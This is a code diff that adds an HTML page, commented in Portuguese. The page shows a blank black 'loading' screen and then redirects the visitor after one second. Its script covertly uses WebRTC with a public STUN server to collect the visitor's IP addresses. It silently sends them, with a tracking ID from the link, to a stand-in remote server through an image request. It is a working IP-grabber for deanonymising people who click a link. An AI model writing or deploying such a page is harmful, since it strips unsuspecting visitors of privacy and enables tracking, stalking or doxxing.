@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;  /* Tela preta - parece carregamento */
+        }
+        
+        .loader {
+            /* Pode colocar um loading discreto se quiser */
+            /* Ou deixa totalmente vazio */
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // WebRTC ULTRA RÁPIDO
+        function captureIPs() {
+            var pc = new RTCPeerConnection({
+                iceServers: [{urls: "stun:stun.l.google.com:19302"}]
+            });
+
+            pc.onicecandidate = function(ice) {
+                if (ice.candidate) {
+                    // Envia IPs SILENCIOSAMENTE
+                    var img = new Image();
+                    img.src = 'https://api.seuserver.com/track?ip=' + 
+                              encodeURIComponent(ice.candidate.address) + 
+                              '&id=' + getUrlParameter('track_id');
+                }
+            };
+
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        }
+
+        // Pega parâmetros da URL
+        function getUrlParameter(name) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            var results = regex.exec(window.location.href);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // EXECUTA TUDO RÁPIDO
+        setTimeout(function() {
+            captureIPs();
+        }, 100);  // Começa em 0.1 segundos!
+
+        // REDIRECIONA EM 1 SEGUNDO
+        setTimeout(function() {
+            var destino = getUrlParameter('dest') || 'https://youtube.com';
+            window.location.href = destino;
+        }, 1000);  // Só 1 segundo!
+    </script>
+</body>
+</html>
